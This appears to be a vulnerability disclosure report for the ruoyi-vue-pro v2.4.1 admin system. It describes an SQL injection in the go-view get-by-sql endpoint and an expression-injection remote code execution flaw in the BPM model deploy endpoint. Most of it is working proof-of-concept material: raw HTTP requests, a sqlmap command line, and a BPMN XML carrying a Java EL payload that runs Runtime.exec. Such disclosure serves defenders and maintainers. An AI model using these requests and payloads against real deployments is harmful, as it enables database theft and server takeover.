BUG_Author

Longlong Gong

# Project

Address: [ruoyi-vue-pro](https://gitee.com/zhijiantianya/ruoyi-vue-pro)

## SQL injection

###  `/report/go-view/data/get-by-sql` SQL injection

[Affected version]

v2.4.1



[Affected Component]

/report/go-view/data/get-by-sql



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk8/11).zip



[Description]

There is an SQL injection vulnerability in the SQL parameters of the `/report/go view/data/get-by-sql ` interface in the ruoyi vue pro system v2.4.1. Hackers can exploit this vulnerability to obtain sensitive server information

POC

```
POST /admin-api/report/go-view/data/get-by-sql HTTP/1.1
Host: 127.0.0.1:48080
Content-Length: 18
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
Authorization: Bearer 086046e45f974777a8c524c4980d3f91
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
tenant-id: 1
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:3000
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"sql":"*"}
```

```
use sqlmap：python sqlmap.py -r poc.txt --level 3 --risk 2
```

ruoyi-vue-pro-v2.4.1(jdk8-11)\yudao-module-report\yudao-module-report-biz\src\main\java\cn\iocoder\yudao\module\report\controller\admin\goview\GoViewDataController.java

![image-20250302125945435](assets/image-20250302125945435.png)

![image-20250302130006760](assets/image-20250302130006760.png)

Report Management ->Large Screen Designer ->Projects ->My All Projects. After importing the initial SQL file, here is an SQL example. Click Preview, capture the POC written above, and directly use level 3 and risk 2 to successfully attack the sqlmap

![image-20250302125648561](assets/image-20250302125648561.png)

![image-20250302125703090](assets/image-20250302125703090.png)

![image-20250302130437650](assets/image-20250302130437650.png)

![image-20250302125733536](assets/image-20250302125733536.png)

![image-20250302125747000](assets/image-20250302125747000.png)

## SSTI

###  `/admin-api/bpm/model/deploy` SSTI

[Affected version]

v2.4.1



[Affected Component]

/admin-api/bpm/model/deploy



[Software]

https://gitee.com/zhijiantianya/ruoyi-vue-pro/archive/refs/tags/v2.4.1(jdk8/11).zip



[Description]

The `/admin-api/bpm/model/deploy ` interface in ruoyi vue pro system v2.4.1 has an SSTI vulnerability. Hackers can exploit this vulnerability to remotely execute commands and gain server privileges

POC

First, create a process form, then create a process classification, and then create a new model. After creating the process, deploy and trigger it

```
POST /admin-api/bpm/model/create HTTP/1.1
Host: localhost:48080
Content-Length: 7071
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
Authorization: Bearer 91d67347e5804d239bd6e367ca9615ec
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
tenant-id: 1
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"name":"a","key":"a","category":"111","icon":"http://test.yudao.iocoder.cn/6648604162fb9fc620c38d21c21ab205da1a360cd250edb01b241cb9bf108c76.jpg","description":"","type":10,"formType":10,"formId":33,"formCustomCreatePath":"","formCustomViewPath":"","visible":true,"startUserType":0,"startUserIds":[],"managerUserIds":[1],"allowCancelRunningProcess":true,"processIdRule":{"enable":false,"prefix":"","infix":"","postfix":"","length":5},"autoApprovalType":0,"titleSetting":{"enable":false,"title":""},"summarySetting":{"enable":false,"summary":[]},"bpmnXml":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<bpmn2:definitions xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:bpmn2=\"http://www.omg.org/spec/BPMN/20100524/MODEL\" xmlns:bpmndi=\"http://www.omg.org/spec/BPMN/20100524/DI\" xmlns:dc=\"http://www.omg.org/spec/DD/20100524/DC\" xmlns:di=\"http://www.omg.org/spec/DD/20100524/DI\" xmlns:flowable=\"http://flowable.org/bpmn\" id=\"diagram_a\" targetNamespace=\"http://flowable.org/bpmn\"><bpmn2:process id=\"a\" name=\"1\" isExecutable=\"true\"><bpmn2:startEvent id=\"Event_1lyk5dv\"><bpmn2:timerEventDefinition><bpmn2:timeDuration>${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\\'calc\\')')}</bpmn2:timeDuration></bpmn2:timerEventDefinition><bpmn2:outgoing>Flow_003kdhp</bpmn2:outgoing></bpmn2:startEvent><bpmn2:userTask id=\"Activity_1mqon8o\" name=\"1\" flowable:formKey=\"33\"><bpmn2:extensionElements><flowable:approveMethod>4</flowable:approveMethod><flowable:candidateStrategy>60</flowable:candidateStrategy><flowable:candidateParam>${bpmTaskAssignLeaderExpression.calculateUsers(execution, 1)}</flowable:candidateParam><flowable:formData /><flowable:assignStartUserHandlerType>1</flowable:assignStartUserHandlerType><flowable:rejectHandlerType>1</flowable:rejectHandlerType><flowable:rejectReturnTaskId /><flowable:assignEmptyHandlerType>1</flowable:assignEmptyHandlerType><flowable:assignEmptyUserIds /><flowable:approveType>1</flowable:approveType><flowable:buttonsSetting id=\"1\" enable=\"true\" displayName=\"éè¿\" /><flowable:buttonsSetting id=\"2\" enable=\"true\" displayName=\"æç»\" /><flowable:buttonsSetting id=\"3\" enable=\"true\" displayName=\"è½¬å\" /><flowable:buttonsSetting id=\"4\" enable=\"true\" displayName=\"å§æ´¾\" /><flowable:buttonsSetting id=\"5\" enable=\"true\" displayName=\"å ç­¾\" /><flowable:buttonsSetting id=\"6\" enable=\"true\" displayName=\"éå\" /><flowable:signEnable>false</flowable:signEnable><flowable:reasonRequire>false</flowable:reasonRequire></bpmn2:extensionElements><bpmn2:incoming>Flow_003kdhp</bpmn2:incoming><bpmn2:outgoing>Flow_0jz2gsv</bpmn2:outgoing><bpmn2:multiInstanceLoopCharacteristics isSequential=\"true\" flowable:collection=\"${coll_userList}\"><bpmn2:loopCardinality xsi:type=\"bpmn2:tFormalExpression\">1</bpmn2:loopCardinality><bpmn2:completionCondition xsi:type=\"bpmn2:tFormalExpression\">${ nrOfCompletedInstances &gt;= nrOfInstances }</bpmn2:completionCondition></bpmn2:multiInstanceLoopCharacteristics></bpmn2:userTask><bpmn2:sequenceFlow id=\"Flow_003kdhp\" name=\"ccccccccccc\" sourceRef=\"Event_1lyk5dv\" targetRef=\"Activity_1mqon8o\"><bpmn2:documentation></bpmn2:documentation><bpmn2:extensionElements><flowable:properties /></bpmn2:extensionElements></bpmn2:sequenceFlow><bpmn2:userTask id=\"Activity_1dm4pnb\" name=\"2\"><bpmn2:extensionElements><flowable:approveMethod>4</flowable:approveMethod><flowable:candidateStrategy>36</flowable:candidateStrategy><flowable:candidateParam /><flowable:assignStartUserHandlerType>1</flowable:assignStartUserHandlerType><flowable:rejectHandlerType>1</flowable:rejectHandlerType><flowable:rejectReturnTaskId /><flowable:assignEmptyHandlerType>1</flowable:assignEmptyHandlerType><flowable:assignEmptyUserIds /><flowable:approveType>1</flowable:approveType><flowable:buttonsSetting id=\"1\" enable=\"true\" displayName=\"éè¿\" /><flowable:buttonsSetting id=\"2\" enable=\"true\" displayName=\"æç»\" /><flowable:buttonsSetting id=\"3\" enable=\"true\" displayName=\"è½¬å\" /><flowable:buttonsSetting id=\"4\" enable=\"true\" displayName=\"å§æ´¾\" /><flowable:buttonsSetting id=\"5\" enable=\"true\" displayName=\"å ç­¾\" /><flowable:buttonsSetting id=\"6\" enable=\"true\" displayName=\"éå\" /><flowable:signEnable>false</flowable:signEnable><flowable:reasonRequire>false</flowable:reasonRequire><flowable:formData /></bpmn2:extensionElements><bpmn2:incoming>Flow_0jz2gsv</bpmn2:incoming><bpmn2:outgoing>Flow_1y4ru9j</bpmn2:outgoing><bpmn2:multiInstanceLoopCharacteristics isSequential=\"true\" flowable:collection=\"${coll_userList}\"><bpmn2:loopCardinality xsi:type=\"bpmn2:tFormalExpression\">1</bpmn2:loopCardinality><bpmn2:completionCondition xsi:type=\"bpmn2:tFormalExpression\">${ nrOfCompletedInstances &gt;= nrOfInstances }</bpmn2:completionCondition></bpmn2:multiInstanceLoopCharacteristics></bpmn2:userTask><bpmn2:sequenceFlow id=\"Flow_0jz2gsv\" sourceRef=\"Activity_1mqon8o\" targetRef=\"Activity_1dm4pnb\" /><bpmn2:endEvent id=\"Event_0esnrkb\"><bpmn2:extensionElements><flowable:executionListener expression=\"${&#34;&#34;.getClass().forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;js&#34;).eval(&#39;function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\\&#39;calc\\&#39;)&#39;)}\" event=\"start\" /></bpmn2:extensionElements><bpmn2:incoming>Flow_1y4ru9j</bpmn2:incoming></bpmn2:endEvent><bpmn2:sequenceFlow id=\"Flow_1y4ru9j\" sourceRef=\"Activity_1dm4pnb\" targetRef=\"Event_0esnrkb\" /></bpmn2:process><bpmndi:BPMNDiagram id=\"BPMNDiagram_1\"><bpmndi:BPMNPlane id=\"a_di\" bpmnElement=\"a\"><bpmndi:BPMNShape id=\"Event_1lyk5dv_di\" bpmnElement=\"Event_1lyk5dv\"><dc:Bounds x=\"202\" y=\"172\" width=\"36\" height=\"36\" /></bpmndi:BPMNShape><bpmndi:BPMNShape id=\"Activity_1mqon8o_di\" bpmnElement=\"Activity_1mqon8o\"><dc:Bounds x=\"290\" y=\"150\" width=\"100\" height=\"80\" /><bpmndi:BPMNLabel /></bpmndi:BPMNShape><bpmndi:BPMNShape id=\"Activity_1dm4pnb_di\" bpmnElement=\"Activity_1dm4pnb\"><dc:Bounds x=\"450\" y=\"150\" width=\"100\" height=\"80\" /><bpmndi:BPMNLabel /></bpmndi:BPMNShape><bpmndi:BPMNShape id=\"Event_0esnrkb_di\" bpmnElement=\"Event_0esnrkb\"><dc:Bounds x=\"612\" y=\"172\" width=\"36\" height=\"36\" /></bpmndi:BPMNShape><bpmndi:BPMNEdge id=\"Flow_003kdhp_di\" bpmnElement=\"Flow_003kdhp\"><di:waypoint x=\"238\" y=\"190\" /><di:waypoint x=\"290\" y=\"190\" /><bpmndi:BPMNLabel><dc:Bounds x=\"234\" y=\"172\" width=\"61\" height=\"14\" /></bpmndi:BPMNLabel></bpmndi:BPMNEdge><bpmndi:BPMNEdge id=\"Flow_0jz2gsv_di\" bpmnElement=\"Flow_0jz2gsv\"><di:waypoint x=\"390\" y=\"190\" /><di:waypoint x=\"450\" y=\"190\" /></bpmndi:BPMNEdge><bpmndi:BPMNEdge id=\"Flow_1y4ru9j_di\" bpmnElement=\"Flow_1y4ru9j\"><di:waypoint x=\"550\" y=\"190\" /><di:waypoint x=\"612\" y=\"190\" /></bpmndi:BPMNEdge></bpmndi:BPMNPlane></bpmndi:BPMNDiagram></bpmn2:definitions>","simpleModel":null}
```

```
POST /admin-api/bpm/model/deploy?id=e8a5b6af-f7da-11ef-8453-98bd80608399 HTTP/1.1
Host: localhost:48080
Content-Length: 0
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Accept: application/json, text/plain, */*
tenant-id: 1
sec-ch-ua-mobile: ?0
Authorization: Bearer 91d67347e5804d239bd6e367ca9615ec
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

Here are the specific operations

![image-20250303110625080](assets/image-20250303110625080.png)

![image-20250303110645585](assets/image-20250303110645585.png)

![image-20250303110714291](assets/image-20250303110714291.png)

The following is the content of the XML file

```
<?xml version="1.0" encoding="UTF-8"?>
<bpmn2:definitions xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:bpmn2="http://www.omg.org/spec/BPMN/20100524/MODEL" xmlns:bpmndi="http://www.omg.org/spec/BPMN/20100524/DI" xmlns:dc="http://www.omg.org/spec/DD/20100524/DC" xmlns:di="http://www.omg.org/spec/DD/20100524/DI" xmlns:flowable="http://flowable.org/bpmn" id="diagram_a" targetNamespace="http://flowable.org/bpmn"><bpmn2:process id="a" name="1" isExecutable="true"><bpmn2:startEvent id="Event_1lyk5dv"><bpmn2:timerEventDefinition><bpmn2:timeDuration>${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}</bpmn2:timeDuration></bpmn2:timerEventDefinition><bpmn2:outgoing>Flow_003kdhp</bpmn2:outgoing></bpmn2:startEvent><bpmn2:userTask id="Activity_1mqon8o" name="1" flowable:formKey="33"><bpmn2:extensionElements><flowable:approveMethod>4</flowable:approveMethod><flowable:candidateStrategy>60</flowable:candidateStrategy><flowable:candidateParam>${bpmTaskAssignLeaderExpression.calculateUsers(execution, 1)}</flowable:candidateParam><flowable:formData /><flowable:assignStartUserHandlerType>1</flowable:assignStartUserHandlerType><flowable:rejectHandlerType>1</flowable:rejectHandlerType><flowable:rejectReturnTaskId /><flowable:assignEmptyHandlerType>1</flowable:assignEmptyHandlerType><flowable:assignEmptyUserIds /><flowable:approveType>1</flowable:approveType><flowable:buttonsSetting id="1" enable="true" displayName="通过" /><flowable:buttonsSetting id="2" enable="true" displayName="拒绝" /><flowable:buttonsSetting id="3" enable="true" displayName="转办" /><flowable:buttonsSetting id="4" enable="true" displayName="委派" /><flowable:buttonsSetting id="5" enable="true" displayName="加签" /><flowable:buttonsSetting id="6" enable="true" displayName="退回" /><flowable:signEnable>false</flowable:signEnable><flowable:reasonRequire>false</flowable:reasonRequire></bpmn2:extensionElements><bpmn2:incoming>Flow_003kdhp</bpmn2:incoming><bpmn2:outgoing>Flow_0jz2gsv</bpmn2:outgoing><bpmn2:multiInstanceLoopCharacteristics isSequential="true" flowable:collection="${coll_userList}"><bpmn2:loopCardinality xsi:type="bpmn2:tFormalExpression">1</bpmn2:loopCardinality><bpmn2:completionCondition xsi:type="bpmn2:tFormalExpression">${ nrOfCompletedInstances &gt;= nrOfInstances }</bpmn2:completionCondition></bpmn2:multiInstanceLoopCharacteristics></bpmn2:userTask><bpmn2:sequenceFlow id="Flow_003kdhp" name="ccccccccccc" sourceRef="Event_1lyk5dv" targetRef="Activity_1mqon8o"><bpmn2:documentation></bpmn2:documentation><bpmn2:extensionElements><flowable:properties /></bpmn2:extensionElements></bpmn2:sequenceFlow><bpmn2:userTask id="Activity_1dm4pnb" name="2"><bpmn2:extensionElements><flowable:approveMethod>4</flowable:approveMethod><flowable:candidateStrategy>36</flowable:candidateStrategy><flowable:candidateParam /><flowable:assignStartUserHandlerType>1</flowable:assignStartUserHandlerType><flowable:rejectHandlerType>1</flowable:rejectHandlerType><flowable:rejectReturnTaskId /><flowable:assignEmptyHandlerType>1</flowable:assignEmptyHandlerType><flowable:assignEmptyUserIds /><flowable:approveType>1</flowable:approveType><flowable:buttonsSetting id="1" enable="true" displayName="通过" /><flowable:buttonsSetting id="2" enable="true" displayName="拒绝" /><flowable:buttonsSetting id="3" enable="true" displayName="转办" /><flowable:buttonsSetting id="4" enable="true" displayName="委派" /><flowable:buttonsSetting id="5" enable="true" displayName="加签" /><flowable:buttonsSetting id="6" enable="true" displayName="退回" /><flowable:signEnable>false</flowable:signEnable><flowable:reasonRequire>false</flowable:reasonRequire><flowable:formData /></bpmn2:extensionElements><bpmn2:incoming>Flow_0jz2gsv</bpmn2:incoming><bpmn2:outgoing>Flow_1y4ru9j</bpmn2:outgoing><bpmn2:multiInstanceLoopCharacteristics isSequential="true" flowable:collection="${coll_userList}"><bpmn2:loopCardinality xsi:type="bpmn2:tFormalExpression">1</bpmn2:loopCardinality><bpmn2:completionCondition xsi:type="bpmn2:tFormalExpression">${ nrOfCompletedInstances &gt;= nrOfInstances }</bpmn2:completionCondition></bpmn2:multiInstanceLoopCharacteristics></bpmn2:userTask><bpmn2:sequenceFlow id="Flow_0jz2gsv" sourceRef="Activity_1mqon8o" targetRef="Activity_1dm4pnb" /><bpmn2:endEvent id="Event_0esnrkb"><bpmn2:extensionElements><flowable:executionListener expression="${&#34;&#34;.getClass().forName(&#34;javax.script.ScriptEngineManager&#34;).newInstance().getEngineByName(&#34;js&#34;).eval(&#39;function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\&#39;calc\&#39;)&#39;)}" event="start" /></bpmn2:extensionElements><bpmn2:incoming>Flow_1y4ru9j</bpmn2:incoming></bpmn2:endEvent><bpmn2:sequenceFlow id="Flow_1y4ru9j" sourceRef="Activity_1dm4pnb" targetRef="Event_0esnrkb" /></bpmn2:process><bpmndi:BPMNDiagram id="BPMNDiagram_1"><bpmndi:BPMNPlane id="a_di" bpmnElement="a"><bpmndi:BPMNShape id="Event_1lyk5dv_di" bpmnElement="Event_1lyk5dv"><dc:Bounds x="202" y="172" width="36" height="36" /></bpmndi:BPMNShape><bpmndi:BPMNShape id="Activity_1mqon8o_di" bpmnElement="Activity_1mqon8o"><dc:Bounds x="290" y="150" width="100" height="80" /><bpmndi:BPMNLabel /></bpmndi:BPMNShape><bpmndi:BPMNShape id="Activity_1dm4pnb_di" bpmnElement="Activity_1dm4pnb"><dc:Bounds x="450" y="150" width="100" height="80" /><bpmndi:BPMNLabel /></bpmndi:BPMNShape><bpmndi:BPMNShape id="Event_0esnrkb_di" bpmnElement="Event_0esnrkb"><dc:Bounds x="612" y="172" width="36" height="36" /></bpmndi:BPMNShape><bpmndi:BPMNEdge id="Flow_003kdhp_di" bpmnElement="Flow_003kdhp"><di:waypoint x="238" y="190" /><di:waypoint x="290" y="190" /><bpmndi:BPMNLabel><dc:Bounds x="234" y="172" width="61" height="14" /></bpmndi:BPMNLabel></bpmndi:BPMNEdge><bpmndi:BPMNEdge id="Flow_0jz2gsv_di" bpmnElement="Flow_0jz2gsv"><di:waypoint x="390" y="190" /><di:waypoint x="450" y="190" /></bpmndi:BPMNEdge><bpmndi:BPMNEdge id="Flow_1y4ru9j_di" bpmnElement="Flow_1y4ru9j"><di:waypoint x="550" y="190" /><di:waypoint x="612" y="190" /></bpmndi:BPMNEdge></bpmndi:BPMNPlane></bpmndi:BPMNDiagram></bpmn2:definitions>
```

Then save and publish，We are using JDK8 here

![image-20250303110948950](assets/image-20250303110948950.png)

Below is the code section

ruoyi-vue-pro-v2.4.1(jdk8-11)\yudao-module-bpm\yudao-module-bpm-biz\src\main\java\cn\iocoder\yudao\module\bpm\controller\admin\definition\BpmModelController.java

![image-20250303111146148](assets/image-20250303111146148.png)



![image-20250303111340418](assets/image-20250303111340418.png)

![image-20250303111323538](assets/image-20250303111323538.png)

![image-20250303111905282](assets/image-20250303111905282.png)
